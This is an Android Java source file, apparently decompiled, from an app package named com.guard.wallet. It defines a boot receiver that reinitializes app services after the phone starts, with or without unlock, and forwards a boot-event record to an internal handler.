package com.guard.wallet.receiver;

import com.guard.wallet.core.AppUtils;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.UserManager;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.BootEventVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.utils.SharedPrefsManager;
import com.guard.wallet.power.SystemBootstrap;

/**
 * vendor BootBroadcast — handles BOOT_COMPLETED and LOCKED_BOOT_COMPLETED.
 */
public class BootBroadcast extends BroadcastReceiver {
    public Integer a = 0;

    @Override
    public final void onReceive(Context var1, Intent var2) {
        try {
            this.a = 1;
            if (var2 == null) {
                return;
            }
            if (AppUtils.B(var2.getAction())) {
                return;
            }

            String action = var2.getAction();
            if ("android.intent.action.BOOT_COMPLETED".equals(action)) {
                Log.d("BootBroadcast", "手机开机了 ");
                SystemBootstrap.reinitialize();
                if (((UserManager) var1.getSystemService("user")).isUserUnlocked()) {
                    SharedPrefsManager.D(1, "has_receive_completed");
                }
            } else if ("android.intent.action.LOCKED_BOOT_COMPLETED".equals(action)) {
                Log.d("BootBroadcast", "手机开机了,没有解锁");
                SystemBootstrap.reinitialize();
            }

            MessageRecordVO var6 = new MessageRecordVO();
            BootEventVO var16 = new BootEventVO();
            var16.setPackageName(var1.getPackageName());
            var16.setHasReceiveCompleted(SharedPrefsManager.i("has_receive_completed"));
            var6.setIntentCode(var2.getAction());
            var6.setExtraBody(var16);
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                MainApplication.getInstance().getHandlerMsgAndTimer().b(var6);
            }
        } catch (Exception var14) {
            AppUtils.s("BootBroadcast", var14);
        }
    }
}
